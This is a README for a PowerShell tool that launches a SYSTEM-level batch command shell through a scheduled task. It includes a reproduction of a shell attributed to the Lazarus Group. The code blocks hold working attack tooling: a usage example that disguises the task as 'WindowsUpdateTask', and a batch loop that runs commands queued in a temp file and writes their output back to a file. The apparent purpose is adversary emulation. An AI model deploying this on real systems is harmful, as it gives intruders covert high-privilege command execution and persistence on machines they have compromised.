# BatchJob

A Powershell script that launches a batch command shell as `SYSTEM` using a run once scheduled task. The batch shell was used by the Lazarus Group to launch commands as a high privilege user.

## Usage

Shell commands are written to a stdin file at which point the cmd shell will sleep for a period, read the lines from the input file, execute them one at a time and redirect output to a stdout file where it can be retrieved. The `die` command is given to stop execution and exit.

### Example

```powershell
Invoke-BatchJob -Path "C:\Windows\Temp\cmd.bat" -InputFile "C:\Windows\Temp\TMP486.tmp" -TaskName "WindowsUpdateTask"
Add-Content -Path "C:\Windows\Temp\TMP486.tmp" -Value "dir C:\Windows\Temp\"
Start-Sleep -Seconds 5
Get-Content -Path "C:\Windows\Temp\TMP486.tmp.ret"
```

## Lazarus Group's Original Shell

```bat
@echo off
SET cmd_path=C:\Windows\Temp\TMP298.tmp
copy NUL %cmd_path%
:loop
ping -n 1 1.1.1.1 > nul
for /f "tokens=*" %%a in (%cmd_path%) do (
    if "%%a" equ "die" (
        rem del /a %cmd_path%
        rem del /a %cmd_path%.ret
        echo die >> %cmd_path%.ret
        goto end
    ) else (
        echo %%a >> %cmd_path%.ret
        %%a >> %cmd_path%.ret 2>&1
        echo -------------------------------------------------------- >> %cmd_path%.ret
    )
)
copy NUL %cmd_path%
goto loop
```
